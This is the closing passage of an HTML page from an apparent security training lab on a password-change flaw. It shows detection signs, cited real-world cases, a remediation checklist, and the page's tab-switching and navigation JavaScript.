                            <h4><i class="fas fa-search"></i> Detection</h4>
                            <ul>
                                <li>Multiple failed password changes for same user</li>
                                <li>Password change attempts with mismatched new passwords</li>
                                <li>Username in request differs from session user</li>
                            </ul>
                        </div>
                    </div>
                </div>

                <!-- Real World Examples -->
                <div class="realworld-section">
                    <h3><i class="fas fa-globe"></i> Real-World Occurrences</h3>

                    <div class="realworld-case">
                        <h4>HackerOne Report #1552047 - Password Reset Account Takeover</h4>
                        <p>Similar vulnerability in a major fintech platform allowed attackers to brute-force passwords through the password reset flow. The error messages differed based on whether the security questions were answered correctly.</p>
                        <span class="bounty">$5,000 Bounty</span>
                    </div>

                    <div class="realworld-case">
                        <h4>CVE-2019-12742 - Zoho ManageEngine</h4>
                        <p>The password change functionality in Zoho ManageEngine allowed remote attackers to change any user's password without authentication due to improper access control on the username parameter.</p>
                        <span class="bounty">CVSS 9.8 Critical</span>
                    </div>

                    <div class="realworld-case">
                        <h4>Authentication Bypass in Enterprise HR System</h4>
                        <p>A Fortune 500 company's HR portal allowed password brute-forcing through the "update password" feature. Different error codes (401 vs 400) revealed whether the current password was valid.</p>
                        <span class="bounty">$15,000 Bounty</span>
                    </div>
                </div>

                <!-- Remediation -->
                <div class="remediation-section">
                    <h3><i class="fas fa-shield-alt"></i> Remediation Checklist</h3>
                    <div class="remediation-list">
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Use Session-Based Identity:</strong> Always get the username from the server-side session, never from user-supplied parameters.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Generic Error Messages:</strong> Return the same error message regardless of whether the current password is correct or incorrect.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Validate New Passwords First:</strong> Check if new passwords match and meet requirements before validating the current password.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Implement Rate Limiting:</strong> Limit password change attempts to 3-5 per 15 minutes with exponential backoff.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Account Lockout:</strong> Temporarily lock the account after multiple failed password change attempts.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Security Logging:</strong> Log all password change attempts with IP, timestamp, and success/failure status for security monitoring.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Session Invalidation:</strong> Invalidate all other sessions after a successful password change to prevent session hijacking.</p>
                        </div>
                        <div class="remediation-item">
                            <i class="fas fa-check-circle"></i>
                            <p><strong>Re-authentication:</strong> Require recent authentication (within last 5 minutes) before allowing password changes.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
    <script>
        // Lab 14 multi-language state
        let currentLang = 'python';
        let currentView = 'vulnerable';

        // Lab 14 Language tab handling
        document.querySelectorAll('.lang-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.lang-tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                currentLang = tab.dataset.lang;
                updateLab14Code();
            });
        });

        // Lab 14 specific code display
        function updateLab14Code() {
            // Only hide/show Lab 14's language-specific containers
            ['python', 'php', 'nodejs', 'java'].forEach(lang => {
                ['vulnerable', 'secure'].forEach(view => {
                    const el = document.getElementById(`code-${lang}-${view}`);
                    if (el) {
                        if (lang === currentLang && view === currentView) {
                            el.classList.remove('hidden');
                        } else {
                            el.classList.add('hidden');
                        }
                    }
                });
            });
        }

        // Handle code tab clicks for ALL labs
        document.querySelectorAll('.code-tab').forEach(tab => {
            tab.addEventListener('click', function(e) {
                e.preventDefault();
                const section = this.closest('.code-review-section');
                const view = this.dataset.view;
                const labId = this.dataset.lab;

                // Update active tab in this section
                section.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
                this.classList.add('active');

                if (labId && labId.startsWith('lab')) {
                    // Labs 1-13: Simple toggle
                    const vulnEl = document.getElementById(`${labId}-vulnerable`);
                    const secureEl = document.getElementById(`${labId}-secure`);

                    if (vulnEl && secureEl) {
                        if (view === 'vulnerable') {
                            vulnEl.classList.remove('hidden');
                            secureEl.classList.add('hidden');
                        } else {
                            vulnEl.classList.add('hidden');
                            secureEl.classList.remove('hidden');
                        }
                    }
                } else {
                    // Lab 14: Multi-language
                    currentView = view;
                    updateLab14Code();
                }
            });
        });

        // Lab sidebar navigation
        document.querySelectorAll('.lab-item:not(.coming-soon)').forEach(item => {
            item.addEventListener('click', () => {
                // Update active state
                document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
                item.classList.add('active');

                // Show selected lab content
                const labId = item.dataset.lab;
                document.querySelectorAll('.lab-content').forEach(content => {
                    content.classList.add('hidden');
                });

                const labContent = document.getElementById(labId);
                if (labContent) {
                    labContent.classList.remove('hidden');
                }
            });
        });

        // Copy code
        function copyCode(codeId) {
            const el = document.getElementById(codeId);
            if (el) {
                navigator.clipboard.writeText(el.innerText);
                alert('Copied!');
            }
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', () => {
            // Click first available lab
            const firstLab = document.querySelector('.lab-item:not(.coming-soon)');
            if (firstLab) firstLab.click();

            // Init Lab 14 code display
            updateLab14Code();
        });
    </script>
</body>
</html>